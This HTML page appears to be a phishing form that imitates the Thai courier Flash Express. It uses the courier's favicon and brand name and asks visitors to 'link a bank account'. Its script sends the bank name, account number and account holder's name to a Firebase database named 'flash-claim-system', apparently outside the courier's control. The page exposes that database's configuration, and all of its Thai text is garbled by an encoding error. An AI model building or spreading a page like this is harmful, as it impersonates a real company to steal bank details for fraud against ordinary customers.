<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" href="https://flashexpress.com/favicon.ico" type="image/x-icon" />
  <title>‡∏ú‡∏π‡∏Å‡∏ö‡∏±‡∏ç‡∏ä‡∏µ‡∏ò‡∏ô‡∏≤‡∏Ñ‡∏≤‡∏£ | Flash Express</title>
  <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: "Prompt", sans-serif;
      background-color: #fffbea;
      text-align: center;
      margin: 0;
      padding: 0;
    }
    header {
      background: #ffeb3b;
      padding: 15px;
      font-weight: bold;
      font-size: 20px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .container {
      margin: 30px auto;
      max-width: 350px;
      background: white;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 3px 6px rgba(0,0,0,0.1);
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 15px;
    }
    button {
      background: #ffeb3b;
      border: none;
      padding: 10px 20px;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover { background: #fdd835; }
    a { display: block; margin-top: 10px; color: purple; text-decoration: none; }
  </style>
</head>
<body>
  <header>üè¶ ‡∏ú‡∏π‡∏Å‡∏ö‡∏±‡∏ç‡∏ä‡∏µ‡∏ò‡∏ô‡∏≤‡∏Ñ‡∏≤‡∏£</header>
  <div class="container">
    <h3>‡∏Å‡∏£‡∏≠‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ö‡∏±‡∏ç‡∏ä‡∏µ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å</h3>
    <input type="text" id="bankName" placeholder="‡∏ä‡∏∑‡πà‡∏≠‡∏ò‡∏ô‡∏≤‡∏Ñ‡∏≤‡∏£" />
    <input type="text" id="accountNumber" placeholder="‡πÄ‡∏•‡∏Ç‡∏ö‡∏±‡∏ç‡∏ä‡∏µ" />
    <input type="text" id="accountOwner" placeholder="‡∏ä‡∏∑‡πà‡∏≠‡πÄ‡∏à‡πâ‡∏≤‡∏Ç‡∏≠‡∏á‡∏ö‡∏±‡∏ç‡∏ä‡∏µ" />
    <button onclick="saveBank()">‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•</button>
    <a href="index.html">‚Üê ‡∏Å‡∏•‡∏±‡∏ö‡∏´‡∏ô‡πâ‡∏≤‡∏´‡∏•‡∏±‡∏Å</a>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
    import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyALSOECmTwrVr0RQAp_b632HmxQ0sJvLMw",
      authDomain: "flash-claim-system.firebaseapp.com",
      databaseURL: "https://flash-claim-system-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "flash-claim-system",
      storageBucket: "flash-claim-system.firebasestorage.app",
      messagingSenderId: "369180040049",
      appId: "1:369180040049:web:6753f5e48a23bc6737b4d0",
      measurementId: "G-VLVBY60G3Q"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const phone = localStorage.getItem("active_customer");
    if (!phone) {
      alert("‚ö†Ô∏è ‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡πÄ‡∏Ç‡πâ‡∏≤‡∏™‡∏π‡πà‡∏£‡∏∞‡∏ö‡∏ö‡∏Å‡πà‡∏≠‡∏ô");
      window.location.href = "login-customer.html";
    }

    async function saveBank() {
      const bankName = document.getElementById("bankName").value.trim();
      const accountNumber = document.getElementById("accountNumber").value.trim();
      const accountOwner = document.getElementById("accountOwner").value.trim();

      if (!bankName || !accountNumber || !accountOwner)
        return alert("‚ö†Ô∏è ‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡∏Å‡∏£‡∏≠‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÉ‡∏´‡πâ‡∏Ñ‡∏£‡∏ö");

      await update(ref(db, "customers/" + phone), {
        bankName, accountNumber, accountOwner
      });

      alert("‚úÖ ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏ö‡∏±‡∏ç‡∏ä‡∏µ‡πÄ‡∏£‡∏µ‡∏¢‡∏ö‡∏£‡πâ‡∏≠‡∏¢‡πÅ‡∏•‡πâ‡∏ß");
      window.location.href = "account.html";
    }
  </script>
</body>
</html>
